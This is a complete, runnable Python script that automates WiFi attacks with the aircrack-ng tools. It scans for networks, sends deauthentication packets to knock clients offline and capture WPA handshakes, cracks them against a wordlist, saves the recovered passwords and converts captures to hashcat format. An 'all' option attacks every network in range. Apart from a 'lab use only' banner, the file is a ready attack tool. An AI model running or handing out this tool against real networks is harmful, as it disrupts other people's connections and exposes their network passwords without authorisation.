#!/usr/bin/env python3
# auto_aircrack_lab.py
# Automated WiFi handshake capture, cracking, and conversion tool (for lab/testing only).
# Includes: scanning, deauth, handshake capture, cracking, .hc22000 conversion
# Enhanced with terminal GUI (colors, highlights, tables)

import os, sys, subprocess, time, re, signal, csv, shutil
from datetime import datetime
from pathlib import Path
from scapy.all import rdpcap, EAPOL
from colorama import Fore, Style, init
from tabulate import tabulate

# Init colorama
init(autoreset=True)

# ---------------- DEFAULT SETTINGS ----------------
SCAN_DURATION = 20          # seconds for scan
DEAUTH_PACKETS = 5          # number of deauth packets
CAPTURE_WAIT = 15           # wait after deauth
# --------------------------------------------------

OUTPUT_DIR = Path("./wifi_results")
REQ_TOOLS = ["airmon-ng","airodump-ng","aireplay-ng","aircrack-ng","timeout","hcxpcapngtool"]
SESSION_DIR = OUTPUT_DIR / f"session-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
SESSION_DIR.mkdir(parents=True, exist_ok=True)

# ---------------- UTILS ----------------
def banner():
    print(Fore.CYAN + Style.BRIGHT + "\n" + "="*65)
    print(Fore.YELLOW + Style.BRIGHT + "     🔥 WiFi Handshake Toolkit (Educational / Lab Use Only) 🔥")
    print(Fore.CYAN + Style.BRIGHT + "="*65 + "\n")

def run(cmd, check=True, background=False, **kwargs):
    if background:
        return subprocess.Popen(cmd, preexec_fn=os.setsid, **kwargs)
    else:
        return subprocess.run(cmd, check=check, **kwargs)

def check_tools():
    for t in REQ_TOOLS:
        if not shutil.which(t):
            print(Fore.RED + f"[!] ERROR: Required tool {t} not found.")
            sys.exit(2)

def cleanup(mon_iface):
    print(Fore.CYAN + "[*] Cleaning up...")
    try:
        subprocess.run(
            ["pkill","-f",f"airodump-ng .*{mon_iface}"],
            stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
        )
        if mon_iface:
            subprocess.run(
                ["airmon-ng","stop",mon_iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
    except KeyboardInterrupt:
        # Ignore Ctrl+C during cleanup
        pass
    except Exception as e:
        print(Fore.RED + f"[!] Cleanup error: {e}")

def ensure_root():
    if os.geteuid() != 0:
        print(Fore.RED + "[!] ERROR: Run as root (sudo).")
        sys.exit(1)

def start_monitor(iface):
    print(Fore.CYAN + f"[*] Starting monitor mode on {iface}...")
    subprocess.run(["airmon-ng","start",iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    mon = iface+"mon"
    if not Path(f"/sys/class/net/{mon}").exists():
        data = subprocess.check_output(["ip","-brief","link"]).decode()
        for line in data.splitlines():
            if "mon" in line: return line.split()[0]
    return mon

def scan_networks(mon_iface, duration):
    prefix = SESSION_DIR / "scan"
    csv_file = f"{prefix}-01.csv"
    print(Fore.YELLOW + f"[*] Scanning for {duration}s ...")
    proc = run(
        ["airodump-ng","--write",str(prefix),"--output-format","csv",mon_iface],
        background=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    time.sleep(2)
    if not Path(csv_file).exists():
        files = list(SESSION_DIR.glob("scan*.csv"))
        if files: csv_file = str(files[0])
    if not Path(csv_file).exists():
        print(Fore.RED + "[!] ERROR: No scan CSV created.")
        sys.exit(3)
    return csv_file

def parse_targets(csv_file):
    targets = []
    with open(csv_file,newline="") as f:
        reader = csv.reader(f)
        for row in reader:
            if len(row) > 13 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", row[0].strip()):
                bssid = row[0].strip()
                chan = row[3].strip()
                essid = row[13].strip()
                if bssid and chan:
                    targets.append((bssid,chan,essid))
    return targets

def check_eapol_in_cap(cap_file):
    try:
        packets = rdpcap(cap_file)
        eapol_pkts = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        return len(eapol_pkts) > 0
    except Exception:
        return False

def capture_handshake(mon_iface, bssid, chan, essid, deauths, wait_time):
    safe_name = re.sub(r"[^A-Za-z0-9._-]","_",f"{essid}_{bssid}")
    cap_prefix = SESSION_DIR / f"capture_{safe_name}"
    cap_file = f"{cap_prefix}-01.cap"
    print(Fore.CYAN + f"\n[*] Target: " + Fore.YELLOW + f"{essid or '<hidden>'} ({bssid})" + Fore.CYAN + f"  CH={chan}")
    proc = run(
        ["airodump-ng","-c",chan,"--bssid",bssid,"-w",str(cap_prefix),mon_iface],
        background=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)
    print(Fore.MAGENTA + f"[*] Sending {deauths} deauths...")
    run(["aireplay-ng","-0",str(deauths),"-a",bssid,mon_iface],
        check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(wait_time)
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    time.sleep(1)
    if Path(cap_file).exists():
        out = subprocess.check_output(["aircrack-ng",cap_file]).decode(errors="ignore")
        if "handshake" in out.lower():
            has_eapol = check_eapol_in_cap(cap_file)
            hs_dir = SESSION_DIR / ("handshakes_eapol" if has_eapol else "handshakes_noeapol")
            hs_dir.mkdir(exist_ok=True)
            new_file = hs_dir / f"{safe_name}.cap"
            os.rename(cap_file, new_file)
            print(Fore.GREEN + f"[+] Handshake saved: {new_file}")
            return new_file if has_eapol else None
    return None

def crack_handshakes(hs_files, wordlist):
    results_file = SESSION_DIR / "results.txt"
    with open(results_file,"a") as f:
        for cap in hs_files:
            print(Fore.CYAN + f"[*] Cracking {cap} ...")
            out = subprocess.run(
                ["aircrack-ng","-w",wordlist,str(cap)],
                capture_output=True,text=True
            ).stdout

            pwd = None
            for line in out.splitlines():
                if "KEY FOUND!" in line:
                    if "[" in line and "]" in line:
                        pwd = line.split("[",1)[1].split("]",1)[0].strip()
                    elif ":" in line:
                        pwd = line.split(":",1)[1].strip()
                    else:
                        pwd = line.replace("KEY FOUND!","").strip()
                    break

            bssid, essid = "?", "?"
            if "_" in Path(cap).stem:
                parts = Path(cap).stem.split("_")
                essid = parts[0]
                bssid = parts[-1]

            f.write(f"{essid},{bssid},{pwd if pwd else 'NOT FOUND'}\n")
            print(Fore.GREEN + f"[+] {essid} ({bssid}) → {pwd if pwd else 'NOT FOUND'}")

    print(Fore.CYAN + f"[*] Results saved to {results_file}")

def convert_to_hc22000(folder):
    cap_files = list(Path(folder).glob("*.cap"))
    if not cap_files:
        print(Fore.RED + "[-] No cap files to convert.")
        return
    out_dir = Path(folder) / "hc22000"
    out_dir.mkdir(exist_ok=True)
    for cap in cap_files:
        out_file = out_dir / (cap.stem + ".hc22000")
        subprocess.run(["hcxpcapngtool","-o",str(out_file),str(cap)])
        if out_file.exists():
            print(Fore.GREEN + f"[+] Converted {cap.name} → {out_file.name}")

def settings_menu():
    global SCAN_DURATION, DEAUTH_PACKETS, CAPTURE_WAIT
    while True:
        print(Fore.CYAN + "\n=== Settings ===")
        print(Fore.YELLOW + f"1. SCAN_DURATION = {SCAN_DURATION}s")
        print(Fore.YELLOW + f"2. DEAUTH_PACKETS = {DEAUTH_PACKETS}")
        print(Fore.YELLOW + f"3. CAPTURE_WAIT = {CAPTURE_WAIT}s")
        print(Fore.MAGENTA + "4. Back")
        choice = input(Fore.CYAN + "Change value (1-3) or back (4): ").strip()
        if choice == "1":
            SCAN_DURATION = int(input("Enter new scan duration (seconds): "))
        elif choice == "2":
            DEAUTH_PACKETS = int(input("Enter new number of deauth packets: "))
        elif choice == "3":
            CAPTURE_WAIT = int(input("Enter new capture wait time (seconds): "))
        elif choice == "4":
            break
        else:
            print(Fore.RED + "[!] Invalid choice.")

# ---------------- MAIN ----------------
def main():
    banner()
    ensure_root()
    check_tools()
    iface = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
    mon_iface = start_monitor(iface)

    eapol_caps = []
    networks_list = []
    selected = []

    try:
        while True:
            if not networks_list:
                csv_file = scan_networks(mon_iface, SCAN_DURATION)
                networks_list = parse_targets(csv_file)

            if not networks_list:
                print(Fore.RED + "[-] No networks found.")
                return

            table_data = [[i+1, essid or "<hidden>", bssid, chan] for i,(bssid,chan,essid) in enumerate(networks_list)]
            print(Fore.CYAN + "\n=== Available Networks ===")
            print(tabulate(table_data, headers=[Fore.YELLOW+"#", Fore.YELLOW+"ESSID", Fore.YELLOW+"BSSID", Fore.YELLOW+"CH"], tablefmt="fancy_grid"))

            choice = input(Fore.MAGENTA + "\nSelect number, 'all', 'settings', 'rescan', or 'exit': ").strip().lower()
            if choice == "exit": break
            if choice == "settings":
                settings_menu()
                continue
            if choice == "rescan":
                networks_list = []
                continue
            if choice == "all":
                selected = networks_list
            else:
                try:
                    selected = [networks_list[int(choice)-1]]
                except:
                    print(Fore.RED + "[!] Invalid choice")
                    continue

            for bssid,chan,essid in selected:
                cap = capture_handshake(mon_iface,bssid,chan,essid,DEAUTH_PACKETS,CAPTURE_WAIT)
                if cap: eapol_caps.append(cap)

            while True:
                print(Fore.CYAN + "\n=== Next Step ===")
                print(Fore.YELLOW + "1. Crack captured handshakes")
                print(Fore.YELLOW + "2. Convert handshakes to .hc22000")
                print(Fore.YELLOW + "3. Retry deauth to capture full EAPOL handshake")
                print(Fore.YELLOW + "4. Settings")
                print(Fore.YELLOW + "5. Rescan")
                print(Fore.RED + "6. Exit")
                print(Fore.YELLOW + "7. Re-select target")

                opt = input(Fore.CYAN + "Choose: ").strip()

                if opt=="1":
                    if not eapol_caps:
                        print(Fore.RED + "[-] No EAPOL handshakes.")
                        continue
                    wl = input(Fore.CYAN + "Enter wordlist path: ").strip()
                    if not Path(wl).exists():
                        print(Fore.RED + "[-] Wordlist not found.")
                        continue
                    crack_handshakes(eapol_caps, wl)

                elif opt=="2":
                    folder = SESSION_DIR / "handshakes_eapol"
                    convert_to_hc22000(folder)

                elif opt=="3":
                    for bssid,chan,essid in selected:
                        cap = capture_handshake(mon_iface,bssid,chan,essid,DEAUTH_PACKETS,CAPTURE_WAIT)
                        if cap and cap not in eapol_caps:
                            eapol_caps.append(cap)

                elif opt=="4":
                    settings_menu()

                elif opt=="5":
                    networks_list = []
                    break

                elif opt=="6":
                    return

                elif opt=="7":
                    break

                else:
                    print(Fore.RED + "[!] Invalid option.")
    finally:
        try:
            cleanup(mon_iface)
        except Exception:
            pass
        print(Fore.CYAN + "[*] Done.")

if __name__=="__main__":
    main()
